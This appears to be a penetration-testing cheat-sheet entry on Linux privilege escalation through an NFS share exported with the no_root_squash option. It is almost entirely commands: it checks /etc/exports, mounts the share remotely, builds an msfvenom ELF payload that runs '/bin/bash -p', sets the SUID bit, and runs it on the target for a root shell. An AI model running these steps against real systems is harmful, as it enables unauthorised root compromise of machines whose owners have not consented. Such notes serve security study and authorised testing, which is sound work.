# NFS

Check the contents of `/etc/exports` for shares with the `no_root_squash` option:

```bash
$ cat /etc/exports
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

No_root_squash means that we can write as root user to that location.

Confirm that the NFS share is available for remote mounting:

```bash
$ showmount -e <TARGET IP>
```

## Exploit

Create a mount point on your local machine and mount the /tmp NFS share:

```bash
$ mkdir /tmp/nfs 
$ mount -o rw,vers=2 192.168.1.25:/tmp /tmp/nfs
```

Using the root user on your local machine, generate a payload and save it to the mounted share:

```bash
$ msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

Make sure the file has the SUID bit set, and is executable by everyone:

```bash
$ chmod +xs /tmp/nfs/shell.elf
```

On the target machine, execute the file to get a root shell:

```bash
$ /tmp/shell.elf
```